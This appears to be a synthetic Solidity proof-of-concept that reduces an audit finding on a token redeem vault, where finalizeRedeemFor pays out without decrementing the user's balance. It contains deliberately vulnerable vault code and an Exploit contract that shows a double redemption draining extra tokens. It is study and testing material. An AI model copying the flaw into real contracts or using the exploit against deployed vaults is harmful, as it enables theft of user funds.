// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Gorples — Missing xGorplesToken / xBorpaBalances decrement in finalizeRedeemFor
    (Halborn, finding #51279)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: finalizeRedeem correctly does
      xBorpaBalances[msg.sender] -= _userRedeem.xBorpaAmount;
    but finalizeRedeemFor does not, leaving an inflated internal balance so the
    user can redeem again and drain more Gorples than they converted.
    Vulnerable path preserved with @> VULN on the missing-decrement site. */

contract MockGorples {
    string public constant name = "GorplesCoin";
    string public constant symbol = "GORP";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Reduced xGorplesToken / xBorpa redeem vault.
contract XGorplesToken {
    struct RedeemInfo {
        uint256 xBorpaAmount;
        uint256 endTime;
    }

    MockGorples public immutable gorples;
    address public system; // role that may call finalizeRedeemFor
    // Zero duration so finalize is immediately available without cheatcode warps.
    // The production constant is multi-day; the bug is the missing balance decrement.
    uint256 public constant REDEEM_DURATION = 0;

    mapping(address => uint256) public xBorpaBalances;
    mapping(address => RedeemInfo[]) public userRedeems;

    constructor(MockGorples gorples_, address system_) {
        gorples = gorples_;
        system = system_;
    }

    function convert(uint256 amount) external {
        gorples.transferFrom(msg.sender, address(this), amount);
        xBorpaBalances[msg.sender] += amount;
    }

    function redeem(uint256 amount) external {
        require(xBorpaBalances[msg.sender] >= amount, "insufficient x balance");
        // Queue redeem; xBorpaBalances is decremented only on finalize (correct path).
        userRedeems[msg.sender].push(RedeemInfo({xBorpaAmount: amount, endTime: block.timestamp + REDEEM_DURATION}));
    }

    function getUserRedeemsLength(address user) external view returns (uint256) {
        return userRedeems[user].length;
    }

    function finalizeRedeem(uint256 redeemIndex) public {
        require(redeemIndex < userRedeems[msg.sender].length, "bad index");
        RedeemInfo storage _userRedeem = userRedeems[msg.sender][redeemIndex];
        require(block.timestamp >= _userRedeem.endTime, "not matured");

        xBorpaBalances[msg.sender] = xBorpaBalances[msg.sender] - _userRedeem.xBorpaAmount;
        uint256 amt = _userRedeem.xBorpaAmount;
        _deleteRedeemEntry(redeemIndex, msg.sender);
        gorples.transfer(msg.sender, amt);
    }

    /// @dev SYSTEM finalizes all matured redeems for `_for`. Missing the balance decrement.
    function finalizeRedeemFor(address _for) external {
        require(msg.sender == system, "only SYSTEM");
        uint256 len = userRedeems[_for].length;
        //E @audit missing decrement — unlike finalizeRedeem there is no
        // xBorpaBalances[_for] -= _userRedeem.xBorpaAmount before/after payout.
        // FIX: xBorpaBalances[_for] = xBorpaBalances[_for] - _userRedeem.xBorpaAmount; when finalized
        while (len > 0) {
            RedeemInfo storage _userRedeem = userRedeems[_for][len - 1];
            bool finalized = _easyFinalizeRedeem(_for, _userRedeem.xBorpaAmount, _userRedeem.endTime); // @> VULN: pays out without xBorpaBalances[_for] -= amount

            if (finalized) {
                _deleteRedeemEntry(len - 1, _for);
            }

            len -= 1;
        }
    }

    function _easyFinalizeRedeem(address _for, uint256 xAmt, uint256 endTime) internal returns (bool) {
        if (block.timestamp < endTime) return false;
        // Pays out Gorples but does NOT decrement xBorpaBalances (the bug).
        gorples.transfer(_for, xAmt);
        return true;
    }

    function _deleteRedeemEntry(uint256 index, address user) internal {
        uint256 last = userRedeems[user].length - 1;
        if (index != last) {
            userRedeems[user][index] = userRedeems[user][last];
        }
        userRedeems[user].pop();
    }
}

/// @dev User helper so create-order stays on Exploit nonces.
contract UserWallet {
    function approveAndConvert(XGorplesToken x, MockGorples g, uint256 amount) external {
        g.approve(address(x), amount);
        x.convert(amount);
    }

    function doRedeem(XGorplesToken x, uint256 amount) external {
        x.redeem(amount);
    }

    function doRedeemAgain(XGorplesToken x, uint256 amount) external {
        x.redeem(amount);
    }

    function finalizeSelf(XGorplesToken x, uint256 idx) external {
        x.finalizeRedeem(idx);
    }
}

contract Exploit {
    MockGorples public gorples; // CREATE nonce 1
    UserWallet public user; // CREATE nonce 2
    XGorplesToken public xToken; // CREATE nonce 3 — vulnerable
    // system role = address(this)

    uint256 public constant AMOUNT = 1000 ether;

    constructor() {
        gorples = new MockGorples();
        user = new UserWallet();
        xToken = new XGorplesToken(gorples, address(this));
        // Seed vault + user: user converts AMOUNT once.
        gorples.mint(address(user), AMOUNT);
        // Extra Gorples held by the vault would be wrong; convert pulls into vault.
        // For a second payout after double-redeem, vault must hold 2*AMOUNT after first
        // convert only holds AMOUNT — second finalize would fail transfer.
        // So mint extra inventory into the vault representing protocol reserve:
        gorples.mint(address(xToken), AMOUNT);
    }

    function run() external {
        // Convert once.
        user.approveAndConvert(xToken, gorples, AMOUNT);
        require(xToken.xBorpaBalances(address(user)) == AMOUNT, "convert failed");

        // Queue redeem of full balance (REDEEM_DURATION=0 → immediately finalizable).
        user.doRedeem(xToken, AMOUNT);
        require(xToken.getUserRedeemsLength(address(user)) == 1, "redeem queued");

        uint256 gorpBefore = gorples.balanceOf(address(user));

        // SYSTEM finalizes — pays Gorples but leaves xBorpaBalances inflated.
        xToken.finalizeRedeemFor(address(user));

        uint256 gorpAfterFirst = gorples.balanceOf(address(user));
        require(gorpAfterFirst == gorpBefore + AMOUNT, "first payout missing");
        require(xToken.getUserRedeemsLength(address(user)) == 0, "queue not cleared");

        // HARM: balance still AMOUNT after finalization (should be 0).
        require(xToken.xBorpaBalances(address(user)) == AMOUNT, "balance should still be inflated");

        // Inflated balance lets the user redeem AGAIN and receive a second payout.
        user.doRedeemAgain(xToken, AMOUNT);
        xToken.finalizeRedeemFor(address(user));

        uint256 gorpAfterSecond = gorples.balanceOf(address(user));
        require(gorpAfterSecond == gorpBefore + 2 * AMOUNT, "double redeem not demonstrated");
        // User converted only AMOUNT once but extracted 2*AMOUNT Gorples.
    }
}
